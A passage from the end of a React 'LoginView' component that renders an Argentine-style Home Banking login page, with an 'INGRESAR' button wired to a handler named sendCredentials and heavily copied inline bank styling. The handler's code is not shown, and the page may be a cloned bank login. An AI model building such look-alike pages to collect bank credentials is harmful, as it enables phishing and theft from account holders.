                                <Button
                                    className="font-family"
                                    onClick={sendCredentials}
                                    style={{
                                        marginLeft:"0",
                                        marginRight:"0",
                                        cursor:"pointer",
                                        margin:"0 4px",
                                        padding:"0",
                                        height:"45px",
                                        borderRadius:"25px",
                                        color:"#fff",
                                        backgroundColor:"#f37320",
                                        boxShadow:"none",
                                        fontSize:"16px",
                                        fontWeight:"500",
                                        width:"174px",
                                        outline:"0",
                                        border:"none",
                                        display:"inline-block",
                                        textAlign:"center",
                                        minWidth:"88px",
                                        lineHeight:"36px",
                                        overflow:"visible"
                                    }}>
                                    INGRESAR
                                </Button>
                            </div>
                        </div>
                    </div>
                    <div
                        className="font-family"
                        style={{
                            textAlign:"center",
                            boxSizing:"border-box",
                            display:"block"
                        }}>
                        <a
                            className="enlace font-family"
                            style={{
                                cursor:"pointer",
                                color:"#f37320",
                                fontSize:"small",
                                margin:"0",
                                padding:"0",
                                boxSizing:"border-box",
                                textAlign:"center"
                            }}>
                            Recuperar mi clave 
                        </a>
                        <span
                            className="font-family"
                            style={{
                                marginLeft:"15px",
                                marginRight:"15px",
                                color:"#b0b8bf",
                                boxSizing:"border-box",
                                textAlign:"center",
                                fontSize:"1rem",
                                fontWeight:"400",
                                lineHeight:"1.5"
                            }}>
                            |
                        </span>
                        <a
                            className="enlace font-family"
                            style={{
                                textDecoration:"none",
                                cursor:"pointer",
                                color:"#f37320",
                                fontSize:"small",
                                boxSizing:"border-box"
                            }}>
                            Recuperar mi usuario
                        </a>
                    </div>
                    <div
                        style={{
                            textAlign:"center",
                            marginTop:"20px",
                            boxSizing:"border-box",
                            display:"block"
                        }}>
                        <a
                            className="enlace font-family"
                            style={{
                                cursor:"pointer",
                                color:"#f37320",
                                fontSize:"small",
                                margin:"0",
                                padding:"0"
                            }}>
                            SOY NUEVO EN HOME BANKING
                        </a>
                    </div>
                    <div
                        className="align-items-center"
                        style={{
                            marginBottom:"0",
                            alignItems:"center",
                            display:"flex",
                            flexWrap:"wrap",
                            marginRight:"-15px",
                            marginLeft:"-15px",
                            boxSizing:"border-box"
                        }}>
                        <div
                            className="col-12 text4 m_t_8 text-center font-family"
                            style={{
                                marginTop:"8px",
                                color:"#818181",
                                fontSize:"14px",
                                textAlign:"center",
                                flex:"0 0 100%",
                                maxWidth:"100%",
                                position:"relative",
                                width:"100%",
                                paddingRight:"15px",
                                paddingLeft:"15px",
                                boxSizing:"border-box",
                                display:"block"
                            }}>
                            Si tenés dudas mirá este 
                            <a
                                className="font-family"
                                style={{
                                    textDecoration:"underline",
                                    cursor:"pointer",
                                    color:"#818181",
                                    margin:"4px",
                                    padding:"0",
                                    boxSizing:"border-box",
                                    fontSize:"14px",
                                    textAlign:"center"
                                }}>
                                tutorial.
                            </a>
                        </div>
                    </div>
                </Card>
                <div
                    className="font-family"
                    style={{
                        boxSizing:"border-box",
                        fontSize:"1rem",
                        fontWeight:"400",
                        lineHeight:"1.5",
                        color:"#212529",
                        textAlign:"left"
                    }}>
                    <div
                        className="row justify-content-center align-items-center mt-15 font-family"
                        style={{
                            marginTop:"15px",
                            alignItems:"center",
                            justifyContent:"center",
                            display:"flex",
                            flexWrap:"wrap",
                            marginRight:"-15px",
                            marginLeft:"-15px",
                            boxSizing:"border-box",
                            fontSize:"1rem",
                            fontWeight:"400",
                            lineHeight:"1.5",
                            color:"#212529",
                            textAlign:"left"
                        }}>
                        <div
                            className="col-12 text-center col-md-auto font-family"
                            style={{
                                textAlign:"center",
                                paddingRight:"15px",
                                paddingLeft:"15px",
                                boxSizing:"border-box",
                                display:"block",
                                fontSize:"1rem",
                                fontWeight:"400",
                                lineHeight:"1.5",
                                color:"#212529"
                            }}>
                            <a
                                className="enlace terminosCondiciones font-family"
                                style={{
                                    textDecoration:"none",
                                    color:"#fff",
                                    textShadow:"1px 1px 2px #000",
                                    fontSize:"11px",
                                    cursor:"pointer",
                                    margin:"0",
                                    padding:"0",
                                    boxSizing:"border-box",
                                    textAlign:"center"
                                }}>
                                Términos y condiciones
                            </a>
                        </div>
                        <div
                            className="d-none d-md-inline-block col-md-auto p-0 terminosCondicionesSpan m-0"
                            style={{
                                fontSize:"11px",
                                color:"#fff",
                                textShadow:"1px 1px 2px #000",
                                padding:0,
                                margin:0,
                                display:"inline-block",
                                boxSizing:"border-box"
                            }}>
                            |
                        </div>
                        <div
                            className="col-12 text-center col-md-auto font-family"
                            style={{
                                textAlign:"center",
                                position:"relative",
                                paddingRight:"15px",
                                paddingLeft:"15px",
                                boxSizing:"border-box",
                                display:"block",
                                fontSize:"1rem",
                                fontWeight:"400",
                                lineHeight:"1.5",
                                color:"#212529"
                            }}>
                            <a
                                className="enlace terminosCondiciones font-family"
                                style={{
                                    textDecoration:"none",
                                    color:"#fff",
                                    textShadow:"1px 1px 2px #000",
                                    fontSize:"11px",
                                    cursor:"pointer",
                                    margin:"0",
                                    padding:"0",
                                    fontWeight:"400",
                                    lineHeight:"1.5"
                                }}>
                                Políticas de seguridad
                            </a>
                        </div>
                        <div
                            className="d-none d-md-inline-block col-md-auto p-0 terminosCondicionesSpan m-0"
                            style={{
                                fontSize:"11px",
                                color:"#fff",
                                textShadow:"1px 1px 2px #000",
                                padding:0,
                                margin:0,
                                display:"inline-block",
                                boxSizing:"border-box"
                            }}>
                            |
                        </div>
                        <div
                            className="col-12 text-center col-md-auto font-family"
                            style={{
                                textAlign:"center",
                                position:"relative",
                                paddingRight:"15px",
                                paddingLeft:"15px",
                                boxSizing:"border-box",
                                display:"block",
                                fontSize:"1rem",
                                fontWeight:"400",
                                lineHeight:"1.5",
                                color:"#212529"
                            }}>
                            <a
                                className="enlace terminosCondiciones font-family"
                                style={{
                                    textDecoration:"none",
                                    color:"#fff",
                                    textShadow:"1px 1px 2px #000",
                                    fontSize:"11px",
                                    cursor:"pointer",
                                    margin:"0",
                                    padding:"0",
                                    fontWeight:"400",
                                    lineHeight:"1.5"
                                }}>
                                Preguntas frecuentes
                            </a>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    )
}

export default LoginView;